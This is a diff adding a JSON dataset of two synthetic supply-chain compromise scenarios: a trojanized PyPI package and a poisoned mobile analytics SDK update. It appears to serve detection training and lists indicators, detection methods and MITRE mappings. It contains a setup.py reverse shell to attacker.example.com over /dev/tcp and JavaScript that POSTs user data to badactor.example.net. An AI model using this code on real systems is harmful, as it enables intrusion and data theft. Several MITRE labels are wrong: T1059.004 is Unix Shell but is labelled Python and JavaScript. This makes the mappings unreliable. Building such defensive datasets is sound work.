@@ -1,0 +1,74 @@
+{
+  "samples": [
+    {
+      "scenario": "Attackers gain access to a widely used Python package's PyPI account and upload a trojanized version with a backdoor that activates during package installation, allowing remote code execution on developer and CI/CD environments.",
+      "technical_data": {
+        "pypi_package_version": "2.1.0",
+        "setup_py_modification": {
+          "original": "def setup():\n    # normal setup code\n    pass",
+          "compromised": "def setup():\n    import os, subprocess\n    # malicious backdoor executed during install\n    subprocess.Popen(['bash', '-c', 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1'])\n    pass"
+        },
+        "wheel_file_snippet": {
+          "filename": "malicious_package-2.1.0-py3-none-any.whl",
+          "hash": "sha256=abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890",
+          "url": "https://files.pythonhosted.org/packages/ab/cd/malicious_package-2.1.0-py3-none-any.whl"
+        },
+        "malicious_code_snippet": "# setup.py snippet\nimport subprocess\nsubprocess.Popen(['bash', '-c', 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1'])",
+        "network_traffic_sample": "TCP connection established from build server IP 192.168.1.100 to attacker.example.com:4444\nNo HTTP headers (raw TCP shell)",
+        "audit_log_snippet": "[2024-05-15T09:12:30Z] Uploaded package version 2.1.0 to PyPI\n[2024-05-15T09:13:00Z] CI build triggered and installed malicious_package==2.1.0\n[2024-05-15T09:13:05Z] Outbound TCP connection from build server 192.168.1.100 to attacker.example.com:4444",
+        "code_signing_check_failure": "Warning: package wheel signature missing or invalid for malicious_package-2.1.0"
+      },
+      "indicators": [
+        "Unexpected new package version 2.1.0 with setup.py executing unfamiliar subprocess calls",
+        "Outbound raw TCP connections from build environment to unknown external IPs and ports",
+        "Absence or failure of cryptographic signatures on new PyPI package uploads",
+        "Audit logs showing package upload and immediate build environment exploitation",
+        "Presence of reverse shell code embedded inside setup.py install scripts"
+      ],
+      "detection_method": "Static analysis of setup.py files to detect suspicious subprocess or socket calls; monitoring of package upload events for unusual activity; network monitoring of build environment for uncommon outbound TCP connections; verification of package signing and hash integrity upon installation.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1203 - Exploitation for Client Execution",
+        "T1059.004 - Command and Scripting Interpreter: Python",
+        "T1071 - Application Layer Protocol",
+        "T1021 - Remote Services"
+      ]
+    },
+    {
+      "scenario": "Attackers compromise the update server of a popular mobile SDK used for analytics by injecting a malicious update that exfiltrates user data from apps integrating the SDK, distributed via the official SDK update mechanism.",
+      "technical_data": {
+        "sdk_update_version": "5.6.7",
+        "update_manifest_change": {
+          "original": {
+            "version": "5.6.6",
+            "checksum": "sha256:123456abcdef7890"
+          },
+          "compromised": {
+            "version": "5.6.7",
+            "checksum": "sha256:deadbeefcafebabe",
+            "update_url": "https://cdn.examplecdn.com/sdk/5.6.7/malicious_sdk_bundle.zip"
+          }
+        },
+        "malicious_code_snippet": "/* analytics_sdk.js snippet */\nfunction sendAnalytics() {\n  var originalData = collectUserData();\n  var exfilData = encryptData(originalData, 'malicious_key');\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'https://badactor.example.net/exfil', true);\n  xhr.setRequestHeader('Content-Type', 'application/json');\n  xhr.send(JSON.stringify({data: exfilData}));\n}\nsetInterval(sendAnalytics, 15000);",
+        "network_traffic_sample": "POST /exfil HTTP/1.1\r\nHost: badactor.example.net\r\nContent-Type: application/json\r\nContent-Length: 512\r\n\r\n{\"data\":\"e3b0c44298fc1c149afbf4c8996fb924...\"}",
+        "audit_log_snippet": "[2024-06-05T18:45:10Z] SDK update version 5.6.7 published\n[2024-06-05T18:45:15Z] SDK update manifest checksum changed to sha256:deadbeefcafebabe\n[2024-06-05T18:50:20Z] Multiple apps integrating SDK 5.6.7 reported outbound POST requests to badactor.example.net",
+        "code_signing_check_failure": "Signature verification error: SDK update 5.6.7 signature mismatch detected"
+      },
+      "indicators": [
+        "Unexpected SDK update version 5.6.7 with checksum differing from prior versions",
+        "Network POST requests from mobile devices to suspicious exfiltration domain badactor.example.net",
+        "Failed signature verification on SDK update manifest file",
+        "Presence of encrypted data exfiltration JavaScript code in SDK update bundle",
+        "Spike in outbound mobile traffic coincident with SDK update deployment"
+      ],
+      "detection_method": "Verification of SDK update signatures and checksum hashes; behavioral network monitoring on mobile devices for anomalous POST requests; static code analysis of SDK update bundles for suspicious cryptographic and network calls; correlation of SDK update timestamps with network anomalies.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1059.004 - Command and Scripting Interpreter: JavaScript",
+        "T1567.002 - Exfiltration Over Web Service",
+        "T1030 - Data Transfer Size Limits"
+      ]
+    }
+  ]
+}
